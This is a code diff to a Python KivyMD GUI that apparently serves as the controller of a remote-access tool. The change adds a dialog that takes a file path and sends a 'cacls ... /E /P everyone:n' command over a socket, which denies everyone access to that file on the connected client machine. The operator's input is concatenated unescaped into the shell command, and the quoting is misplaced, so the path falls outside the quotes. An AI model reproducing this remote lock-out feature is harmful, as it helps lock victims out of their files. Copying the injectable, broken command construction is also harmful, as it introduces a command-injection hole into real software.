@@ -151,6 +151,16 @@ ScreenManager:
     MDTextField:
         id: taskKillProcessID
         hint_text: 'Enter Process Name'
+
+<DenyFilesContent>
+    orientation: 'vertical'
+    spacing: '12dp'
+    size_hint_y: None
+    height: '120dp'
+
+    MDTextField:
+        id: denyFilesID
+        hint_text: 'Enter File Path'
         
 '''
 
@@ -423,8 +433,26 @@ class Main(MDApp):
 
     # Prevent access to file
     def DenyFiles(self):
+        self.denyFilesDialog = MDDialog(
+            title = "File Path:",
+            type = "custom",
+            content_cls = DenyFilesContent(),
+            buttons = [
+                MDFlatButton(
+                    text = "CANCEL", on_press = lambda x: self.DismissDenyFilesDialog()
+                    ),
+                MDFlatButton(
+                    text = "OK", on_press = lambda x: self.ExecuteDenyFiles()
+                    ),
+                ],
+            )
+        
+    def DismissDenyFilesDialog(self, *args):
+        self.denyFilesDialog.dismiss(force=True)
+
+    def ExecuteDenyFiles(self):
         while True:
-            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
+            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\"' + self.denyFilesDialog.content_cls.ids.denyFilesID.text + ' /E /P everyone:n'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
